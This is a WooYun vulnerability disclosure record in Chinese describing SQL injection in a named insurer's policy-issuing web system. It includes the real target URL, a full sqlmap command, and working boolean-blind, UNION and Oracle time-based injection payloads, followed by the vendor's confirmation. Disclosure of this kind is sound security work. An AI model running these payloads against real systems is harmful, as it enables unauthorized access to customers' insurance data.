{"id": 29152, "wybug_id": "wooyun-2015-0120315", "wybug_title": "华夏人寿保险某系统存在sql注射漏洞", "wybug_corp": "华夏人寿保险", "wybug_author": "茜茜公主", "wybug_date": "2015-06-14 20:42", "wybug_open_date": "2015-08-03 12:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向公众公开  简要描述： sql注射 详细说明：  华夏人寿航意险出单系统地址：http://gdxt.hxlife.com/ui\n\n在访问单系统的时候会加载一个文件，http://gdxt.hxlife.com/ui/common/cvar/CExec.jsp文件内容差不多是下面这样\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GBK\"></head><form name='fm' action='CExec.jsp' method='POST'>\t<input type='hidden' name='txtVarData' value=''>\t<input type='hidden' name='txtCodeName' value=''>\t<input type='hidden' name='txtOther'>\t<input type='hidden' name='txtFrameName'>\t<input type='hidden' name='txtSQL'>\t<input type='hidden' name='startIndex'>\t<input type='hidden' name='txtQueryResult'>\t<input type='hidden' name='mOperate'>\t<input type='hidden' name='txtCodeCondition'>\t<input type='hidden' name='txtConditionField'>\t<input type='hidden' name='txtShowWidth'></form><SCRIPT language=\"JavaScript1.2\">window.status=\"finished\";try{\ttop.achieveEX = true;\t//用于判断页面初始化完成}catch(ex){}</SCRIPT></html>\n通过本地构造参数，放入sqlmap即可\npython SQLMap/SQLMap.py -u \"http://gdxt.hxlife.com/ui/common/cvar/CExec.jsp\" --data \"txtVarData=328044&txtOther=328044&txtFrameName=328044&txtSQL=328044&startIndex=328044&txtQueryResult=328044&mOperate=328044&txtCodeCondition=328044&txtConditionField=328044&txtShowWidth=328044&txtCodeName=328044\" -p txtCodeCondition --risk 3 --level 3 --current-db\n\nParameter: txtCodeCondition (POST)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (Generic comment)    Payload: txtVarData=328044&txtOther=328044&txtFrameName=328044&txtSQL=328044&startIndex=328044&txtQueryResult=328044&mOperate=328044&txtCodeCondition=-5592' OR (2725=2725)-- &txtConditionField=328044&txtShowWidth=328044&txtCodeName=328044    Type: UNION query    Title: Generic UNION query (NULL) - 5 columns    Payload: txtVarData=328044&txtOther=328044&txtFrameName=328044&txtSQL=328044&startIndex=328044&txtQueryResult=328044&mOperate=328044&txtCodeCondition=328044' UNION ALL SELECT CHR(113)||CHR(120)||CHR(107)||CHR(113)||CHR(113)||CHR(103)||CHR(85)||CHR(111)||CHR(85)||CHR(114)||CHR(111)||CHR(121)||CHR(84)||CHR(118)||CHR(118)||CHR(113)||CHR(98)||CHR(118)||CHR(113)||CHR(113),NULL,NULL,NULL,NULL FROM DUAL-- &txtConditionField=328044&txtShowWidth=328044&txtCodeName=328044    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query - comment)    Payload: txtVarData=328044&txtOther=328044&txtFrameName=328044&txtSQL=328044&startIndex=328044&txtQueryResult=328044&mOperate=328044&txtCodeCondition=328044' AND 3821=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--&txtConditionField=328044&txtShowWidth=328044&txtCodeName=328044---[22:31:25] [INFO] the back-end DBMS is Oracleweb application technology: Servlet 2.5, JSP, JSP 2.1back-end DBMS: Oracle\n\n\n   漏洞证明：  \n\n\n\n\n\n\n\n系统数据量很大   修复方案：  过滤   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-19 12:12 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发通报,由其后续协网站调管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}